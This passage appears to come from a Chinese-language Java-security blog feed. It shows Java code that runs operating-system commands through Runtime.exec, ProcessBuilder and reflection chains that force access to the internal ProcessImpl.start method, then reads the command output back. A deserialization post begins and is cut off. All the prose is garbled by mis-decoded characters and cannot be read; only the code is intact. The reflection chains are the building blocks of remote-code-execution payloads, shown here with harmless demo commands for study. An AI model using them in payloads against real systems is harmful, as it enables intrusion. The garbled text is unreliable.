class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">rt.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="2-ç±»è¯¦è§£"><a href="#2-ç±»è¯¦è§£" class="headerlink" title="2.ç±»è¯¦è§£"></a>2.ç±»è¯¦è§£</h3><p><strong>ç±»ä¸­æ–¹æ³•</strong></p><ul><li><p><strong>execæ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String[] cmdarray, String[] envp, File dir)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmdarray)</span><br><span class="line">        .environment(envp)</span><br><span class="line">        .directory(dir)</span><br><span class="line">        .start();</span><br><span class="line">&#125;</span><br><span class="line">rt.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p><strong>getRuntimeæ–¹æ³•</strong></p><ul><li><p>å› ä¸ºä»–æ˜¯å•ä¾‹ç±»ï¼Œæ‰€ä»¥åœ¨åˆ›å»ºç±»æ—¶éœ€è¦ä½¿ç”¨å…¶å†…éƒ¨æä¾›çš„æ„é€ æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">execMethod.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>),<span class="string">&quot;calc&quot;</span>);<span class="comment">//æœ€çŸ­ä»£ç </span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>å®ç°å‘½ä»¤å›æ˜¾</strong></p><p>å½“ä½ è°ƒç”¨ exec æ—¶ï¼Œå®ƒè¿”å›çš„æ˜¯ä¸€ä¸ª java.lang.Process å¯¹è±¡ã€‚å‘½ä»¤çš„æ‰§è¡Œç»“æœï¼ˆæ¯”å¦‚ whoami è¾“å‡ºçš„ç”¨æˆ·åï¼‰æ˜¯åœ¨è¿™ä¸ª Process å¯¹è±¡çš„ <strong>InputStreamï¼ˆè¾“å…¥æµï¼‰</strong> é‡Œçš„ã€‚äºæ˜¯ï¼Œå®ç°ä¸‹é¢æ­¥éª¤å³å¯</p><ol><li>æ‰§è¡Œ<code> exec</code>ï¼Œå¾—åˆ° <code>Process</code> å¯¹è±¡ã€‚</li><li>åå°„è°ƒç”¨<code>Process</code>çš„ <code>getInputStream() </code>æ–¹æ³•ã€‚</li><li>è¯»å–æµä¸­çš„æ•°æ®ã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">process</span> <span class="operator">=</span> execMethod.invoke(runtime, <span class="string">&quot;ipconfig&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; processClass = Class.forName(<span class="string">&quot;java.lang.Process&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">getInputStreamMethod</span> <span class="operator">=</span> processClass.getMethod(<span class="string">&quot;getInputStream&quot;</span>);</span><br><span class="line">java.io.<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> (java.io.InputStream) getInputStreamMethod.invoke(process);</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(is, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>); </span><br><span class="line"><span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;å‘½ä»¤å›æ˜¾ç»“æœ:\n&quot;</span> + output);</span><br></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">       <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream();  </span><br><span class="line"><span class="type">byte</span>[] cache = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];  </span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line"><span class="type">int</span> <span class="variable">readLen</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line"><span class="keyword">while</span> ((readLen = inputStream.read(cache))!=-<span class="number">1</span>)&#123;  </span><br><span class="line">           byteArrayOutputStream.write(cache, <span class="number">0</span>, readLen);  </span><br><span class="line">&#125;  </span><br><span class="line">       System.out.println(byteArrayOutputStream);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></li></ul><h2 id="äºŒã€ProcessBuilderå‘½ä»¤æ‰§è¡Œ"><a href="#äºŒã€ProcessBuilderå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="äºŒã€ProcessBuilderå‘½ä»¤æ‰§è¡Œ"></a>äºŒã€ProcessBuilderå‘½ä»¤æ‰§è¡Œ</h2><h3 id="1-ProcessBuilderç±»"><a href="#1-ProcessBuilderç±»" class="headerlink" title="1.ProcessBuilderç±»"></a>1.ProcessBuilderç±»</h3><ul><li><code>ProcessBuilder</code> æ˜¯ Java æ¨èçš„ç”¨äºåˆ›å»ºæ“ä½œç³»ç»Ÿè¿›ç¨‹çš„æ–¹å¼ã€‚</li></ul><p>æ­£å¸¸è°ƒç”¨è®¡ç®—æœºæ–¹å¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">processBuilder.start();</span><br></pre></td></tr></table></figure><h3 id="2-ç±»è¯¦è§£-1"><a href="#2-ç±»è¯¦è§£-1" class="headerlink" title="2.ç±»è¯¦è§£"></a>2.ç±»è¯¦è§£</h3><ul><li><p><strong>æ„é€ æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ProcessBuilder</span><span class="params">(List&lt;String&gt; command)</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ProcessBuilder</span><span class="params">(String... command)</span> &#123;</span><br></pre></td></tr></table></figure><p>ä¼ å…¥çš„å‚æ•°å³ä¸ºæ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯éœ€è¦åˆ†å¼€ä¼ é€’ï¼Œä¾‹å¦‚ï¼š<code>ProcessBuilder pb = new ProcessBuilder(&quot;ping&quot;, &quot;-n&quot;, &quot;3&quot;, &quot;www.google.com&quot;);</code></p></li><li><p><strong>startæ–¹æ³•</strong></p><p>è¿™æ˜¯å®é™…æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•ã€‚å®ƒä¼šè¿”å›ä¸€ä¸ª <code>Process</code> å¯¹è±¡ï¼Œä»£è¡¨æ­£åœ¨è¿è¡Œçš„å­è¿›ç¨‹ã€‚</p></li><li><p><strong>åå°„é“¾è°ƒç”¨</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ä¼ å‚ä¸ºåˆ—è¡¨</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>)));</span><br><span class="line"><span class="comment">//è¿™é‡Œä¼ å‚ä¸ºåˆ—è¡¨ï¼Œ</span></span><br><span class="line">ä¼ å‚ä¸ºæ•°ç»„</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;));<span class="comment">//è¿™é‡Œä¼ å‚ä¸ºæ•°ç»„</span></span><br></pre></td></tr></table></figure></li><li><p><strong>å›æ˜¾å‘½ä»¤</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">       <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;ipconfig&quot;</span>).start().getInputStream();  </span><br><span class="line"><span class="type">byte</span>[] cache = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];  </span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line"><span class="type">int</span> <span class="variable">readLen</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line"><span class="keyword">while</span> ((readLen = inputStream.read(cache))!=-<span class="number">1</span>)&#123;  </span><br><span class="line">           byteArrayOutputStream.write(cache, <span class="number">0</span>, readLen);  </span><br><span class="line">&#125;  </span><br><span class="line">       System.out.println(byteArrayOutputStream);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></li></ul><h2 id="ä¸‰ã€ProcessImplå‘½ä»¤æ‰§è¡Œ"><a href="#ä¸‰ã€ProcessImplå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ä¸‰ã€ProcessImplå‘½ä»¤æ‰§è¡Œ"></a>ä¸‰ã€ProcessImplå‘½ä»¤æ‰§è¡Œ</h2><h3 id="1-ProcessImplç±»"><a href="#1-ProcessImplç±»" class="headerlink" title="1.ProcessImplç±»"></a>1.ProcessImplç±»</h3><ul><li>å¹³æ—¶ç”¨çš„<code>Runtime.exec()</code>æˆ–è€… <code>ProcessBuilder.start()</code>ï¼Œå…¶å®éƒ½åªæ˜¯â€œä¸­ä»‹â€ã€‚å®ƒä»¬æœ€ç»ˆéƒ½ä¼šè°ƒç”¨ <code>java.lang.ProcessImpl</code>ï¼ˆåœ¨ Windows ä¸Šï¼‰æˆ–<code> java.lang.UNIXProcess</code>ï¼ˆåœ¨ Linux&#x2F;JDK8 åŠæ›´æ—©ç‰ˆæœ¬ä¸Šï¼‰æ¥çœŸæ­£æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</li></ul><p><strong>ä»–æ²¡æœ‰å…¬å¼€æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡åå°„è°ƒç”¨è¯¥ç±»</strong></p><h3 id="2-ç±»è¯¦è§£-2"><a href="#2-ç±»è¯¦è§£-2" class="headerlink" title="2.ç±»è¯¦è§£"></a>2.ç±»è¯¦è§£</h3><ul><li><p><strong><code>start</code>æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Process <span class="title function_">start</span><span class="params">(String cmdarray[],</span></span><br><span class="line"><span class="params">                     java.util.Map&lt;String,String&gt; environment,</span></span><br><span class="line"><span class="params">                     String dir,</span></span><br><span class="line"><span class="params">                     ProcessBuilder.Redirect[] redirects,</span></span><br><span class="line"><span class="params">                     <span class="type">boolean</span> redirectErrorStream)</span></span><br></pre></td></tr></table></figure><p>å…·ä½“å‚æ•°å¦‚ä¸Šï¼Œä»–æ˜¯ä¸€ä¸ª<strong>é™æ€æ–¹æ³•</strong></p><p><strong>ä¾æ—§è¿”å›Processå¯¹è±¡</strong></p></li></ul><h3 id="3-åå°„é“¾"><a href="#3-åå°„é“¾" class="headerlink" title="3.åå°„é“¾"></a>3.åå°„é“¾</h3><ul><li><p><strong>å›æ˜¾</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. è·å–åº•å±‚ç±»</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. è·å– start é™æ€æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">startMethod</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>,</span><br><span class="line">                String[].class,                  <span class="comment">// 1. cmdarray</span></span><br><span class="line">                Map.class,                       <span class="comment">// 2. environment</span></span><br><span class="line">                String.class,                    <span class="comment">// 3. dir</span></span><br><span class="line">                ProcessBuilder.Redirect[].class, <span class="comment">// 4. redirects (è¿™é‡Œæ˜¯æ•°ç»„ç±»å‹ï¼)</span></span><br><span class="line">                <span class="type">boolean</span>.class                    <span class="comment">// 5. redirectErrorStream</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. æš´åŠ›ç ´è§£æƒé™</span></span><br><span class="line">        startMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. æ„é€ å‚æ•°</span></span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;ipconfig&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. è°ƒç”¨ invoke</span></span><br><span class="line">        <span class="comment">// æ³¨æ„ç¬¬4ä¸ªå‚æ•°ä¼  nullã€‚</span></span><br><span class="line">        <span class="comment">// æ ¹æ®æºç ï¼šif (redirects == null) &#123; stdHandles = ... &#125;</span></span><br><span class="line">        <span class="comment">// ä¼  null ä¼šè®©å®ƒè‡ªåŠ¨å»ç”Ÿæˆé»˜è®¤çš„ stdHandlesï¼Œéå¸¸å®Œç¾ã€‚</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">processObj</span> <span class="operator">=</span> startMethod.invoke(<span class="literal">null</span>,</span><br><span class="line">                cmd,</span><br><span class="line">                <span class="literal">null</span>,  <span class="comment">// environment</span></span><br><span class="line">                <span class="literal">null</span>,  <span class="comment">// dir</span></span><br><span class="line">                <span class="literal">null</span>,  <span class="comment">// redirects (å…³é”®ç‚¹ï¼šä¼  null)</span></span><br><span class="line">                <span class="literal">false</span>  <span class="comment">// redirectErrorStream</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// --- 6. å‘½ä»¤å›æ˜¾éƒ¨åˆ† ---</span></span><br><span class="line">        <span class="comment">// æ‹¿åˆ° Process å¯¹è±¡ï¼Œè¯»å–è¾“å‡ºæµ</span></span><br><span class="line">        java.lang.<span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (java.lang.Process) processObj;</span><br><span class="line"></span><br><span class="line">        java.io.<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="comment">// Windows é»˜è®¤ç¼–ç é€šå¸¸æ˜¯ GBK</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(is, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;--- ProcessImpl æˆåŠŸè°ƒç”¨ ---&quot;</span>);</span><br><span class="line">        System.out.println(output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaå®‰å…¨ </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå®‰å…¨-ååºåˆ—åŒ–</title>
      <link href="/2025/12/13/fanxuliehau/"/>
      <url>/2025/12/13/fanxuliehau/</url>
      
        <content type="html"><![CDATA[<h1 id="javaå®‰å…¨-ååºåˆ—åŒ–"><a href="#javaå®‰å…¨-ååºåˆ—åŒ–" class="headerlink" title="javaå®‰å…¨-ååºåˆ—åŒ–"></a>javaå®‰å…¨-ååºåˆ—åŒ–</h1><h2 id="ä¸€ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#ä¸€ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="ä¸€ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>ä¸€ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><h3 id="1-ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Ÿ"><a href="#1-ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Ÿ" class="headerlink" title="1.ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Ÿ"></a>1.ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Ÿ</h3><p>åœ¨ Java çš„ä¸–ç•Œé‡Œï¼Œä¸€åˆ‡çš†å¯¹è±¡ï¼ˆObjectï¼‰ã€‚å¯¹è±¡å­˜åœ¨äºå†…å­˜ä¸­ï¼Œå½“ç¨‹åºåœæ­¢è¿è¡Œæ—¶ï¼Œå†…å­˜ä¸­çš„å¯¹è±¡å°±ä¼šæ¶ˆå¤±ã€‚</p><p>æƒ³æŠŠè¿™ä¸ªå¯¹è±¡ï¼š</p><ol><li><strong>ä¿å­˜ä¸‹æ¥</strong>ï¼ˆä¿å­˜åˆ°æ–‡ä»¶ã€æ•°æ®åº“ï¼‰ï¼›</li><li><strong>ä¼ è¾“ç»™åˆ«äºº</strong>ï¼ˆé€šè¿‡ç½‘ç»œå‘é€åˆ°å¦ä¸€å°æœåŠ¡å™¨ï¼‰ï¼›</li></ol><p>æˆ‘ä»¬å°±éœ€è¦ä¸€ç§æœºåˆ¶æ¥è½¬æ¢è¿™ä¸ªå¯¹è±¡ã€‚</p><ul><li><strong>åºåˆ—åŒ– (Serialization)ï¼š</strong> æŠŠå†…å­˜ä¸­çš„â€œJava å¯¹è±¡â€è½¬æ¢æˆâ€œäºŒè¿›åˆ¶å­—èŠ‚æµï¼ˆbyte streamï¼‰â€çš„è¿‡ç¨‹ã€‚</li><li><strong>ååºåˆ—åŒ– (Deserialization)ï¼š</strong> æŠŠâ€œäºŒè¿›åˆ¶å­—èŠ‚æµâ€æ¢å¤æˆâ€œJava å¯¹è±¡â€çš„è¿‡ç¨‹ã€‚</li></ul><h3 id="2-Java-å¦‚ä½•å®ç°ååºåˆ—åŒ–ï¼Ÿ"><a href="#2-Java-å¦‚ä½•å®ç°ååºåˆ—åŒ–ï¼Ÿ" class="headerlink" title="2. Java å¦‚ä½•å®ç°ååºåˆ—åŒ–ï¼Ÿ"></a>2. Java å¦‚ä½•å®ç°ååºåˆ—åŒ–ï¼Ÿ</h3><ol><li><strong>java.io.Serializable æ¥å£</strong>ï¼šåªæœ‰å®ç°äº†è¿™ä¸ªæ¥å£çš„ç±»ï¼Œå…¶å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ã€‚</li><li><strong>ObjectOutputStream</strong>ï¼šè´Ÿè´£åºåˆ—åŒ–çš„æ–¹æ³•ã€‚</li><li><strong>ObjectInputStream</strong>ï¼šè´Ÿè´£ååºåˆ—åŒ–çš„æ–¹æ³•ã€‚</li></ol><h3 id="3-å¸¸è§ååºåˆ—åŒ–æŠ€æœ¯"><a href="#3-å¸¸è§ååºåˆ—åŒ–æŠ€æœ¯" class="headerlink" title="3.å¸¸è§ååºåˆ—åŒ–æŠ€æœ¯"></a>3.å¸¸è§ååºåˆ—åŒ–æŠ€æœ¯</h3><ol><li><strong>JSON (æœ€ä¸»æµ):</strong><ul><li>å·¥å…·ï¼šJackson, Gson, Fastjsonã€‚</li><li>ä¼˜ç‚¹ï¼šæ–‡æœ¬æ ¼å¼ï¼Œäººç±»å¯è¯»ï¼Œè·¨è¯­è¨€é€šç”¨ï¼ˆå‰ç«¯ JS ä¹Ÿèƒ½è¯»ï¼‰ã€‚</li></ul></li><li><strong>XML:</strong><ul><li>è™½ç„¶è€æ—§ï¼Œä½†åœ¨æŸäº›ä¼ ç»Ÿè¡Œä¸šï¼ˆå¦‚é“¶è¡Œæ¥å£ï¼‰è¿˜åœ¨ç”¨ã€‚</li></ul></li><li><strong>Protocol Buffers (Protobuf) &#x2F; Thrift:</strong><ul><li>Google å’Œ Facebook å¼€å‘çš„ã€‚</li><li>ä¼˜ç‚¹ï¼šäºŒè¿›åˆ¶æ ¼å¼ï¼Œä½“ç§¯æå°ï¼Œé€Ÿåº¦æå¿«ï¼Œé€‚åˆé«˜æ€§èƒ½çš„å¾®æœåŠ¡è°ƒç”¨ï¼ˆRPCï¼‰ã€‚</li></ul></li></ol><h3 id="4-ååºåˆ—åŒ–åº•å±‚åŸç†"><a href="#4-ååºåˆ—åŒ–åº•å±‚åŸç†" class="headerlink" title="4.ååºåˆ—åŒ–åº•å±‚åŸç†"></a>4.ååºåˆ—åŒ–åº•å±‚åŸç†</h3><ul><li><strong>è¯»æµ</strong>ï¼š<code>readObject() </code>å¯åŠ¨ï¼Œæ ¡éªŒé­”æ•°ã€‚</li><li><strong>åŠ è½½ç±»</strong>ï¼š<code>Class.forName()</code>ï¼Œæ£€æŸ¥<code> serialVersionUID</code>ã€‚</li><li><strong>åˆ†é…å†…å­˜</strong>ï¼š<ul><li>æœ¬èº«ï¼š<code>Unsafe.allocateInstance()</code>ï¼ˆä¸è°ƒæ„é€ ï¼‰ã€‚</li><li><strong>çˆ¶ç±»</strong>ï¼šå¦‚æœçˆ¶ç±»æ²¡å®ç°<code> Serializable</code>ï¼Œ<strong>è°ƒç”¨çˆ¶ç±»æ— å‚æ„é€ </strong>ã€‚</li></ul></li><li><strong>æ•°æ®æ¢å¤ï¼ˆåˆ†æ”¯è·¯å¾„ï¼‰</strong>ï¼š<ul><li><strong>è·¯å¾„ Aï¼ˆæ™®é€šï¼‰</strong>ï¼šåå°„ <code>field.set()</code> æš´åŠ›èµ‹å€¼ï¼ˆ<code>transient </code>å­—æ®µè·³è¿‡ï¼‰ã€‚</li><li><strong>è·¯å¾„ Bï¼ˆå±é™©ï¼‰</strong>ï¼šå‘ç°æœ‰ <code>readObject()</code> æ–¹æ³• -&gt; <strong>è°ƒç”¨ä¹‹</strong> -&gt; æ­¤æ—¶å¯èƒ½è§¦å‘æ¶æ„ä»£ç ï¼ˆRCEï¼‰ã€‚</li></ul></li><li><strong>åç»­å¤„ç†</strong>ï¼š<ul><li>æ£€æŸ¥æ˜¯å¦æœ‰<code> readResolve()</code>ï¼ˆç”¨äºæŒ½æ•‘å•ä¾‹ï¼‰ã€‚</li></ul></li><li><strong>è¿”å›å¯¹è±¡</strong>ï¼šè¿™å°±å¾—åˆ°äº†ä¸€ä¸ªå®Œæ•´çš„ Java å¯¹è±¡ã€‚</li></ul><h3 id="5-æ³¨æ„ç‚¹"><a href="#5-æ³¨æ„ç‚¹" class="headerlink" title="5.æ³¨æ„ç‚¹"></a>5.æ³¨æ„ç‚¹</h3><ul><li><strong>é™æ€å˜é‡æ— æ³•åºåˆ—åŒ–</strong></li><li><strong>transient æ ‡è¯†çš„å¯¹è±¡æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ–</strong></li><li><strong>ä¸ºä»€ä¹ˆçˆ¶ç±»æ²¡å®ç° <code>Serializable</code> æ—¶å¿…é¡»è¦æœ‰æ— å‚æ„é€ ï¼Ÿ</strong><ul><li>ååºåˆ—åŒ–ä¸ä¼šæ‰§è¡Œæ„é€ æ–¹æ³•ï¼Œä½†å®ƒå¿…é¡»è®©æ‰€æœ‰â€œæ²¡æœ‰åºåˆ—åŒ–èƒ½åŠ›çš„çˆ¶ç±»ï¼ˆé <code>Serializable</code>ï¼‰â€é€šè¿‡æ— å‚æ„é€ æ–¹æ³•æ¥åˆå§‹åŒ–åŸºç¡€çŠ¶æ€ã€‚</li></ul></li><li><strong>åºåˆ—åŒ–ç±»çš„å±æ€§æ²¡æœ‰å®ç° Serializable é‚£ä¹ˆåœ¨åºåˆ—åŒ–å°±ä¼šæŠ¥é”™</strong></li></ul><h2 id="äºŒã€ä»£ç å®ç°"><a href="#äºŒã€ä»£ç å®ç°" class="headerlink" title="äºŒã€ä»£ç å®ç°"></a>äºŒã€ä»£ç å®ç°</h2><h3 id="1-å¤ç°ä»£ç "><a href="#1-å¤ç°ä»£ç " class="headerlink" title="1.å¤ç°ä»£ç 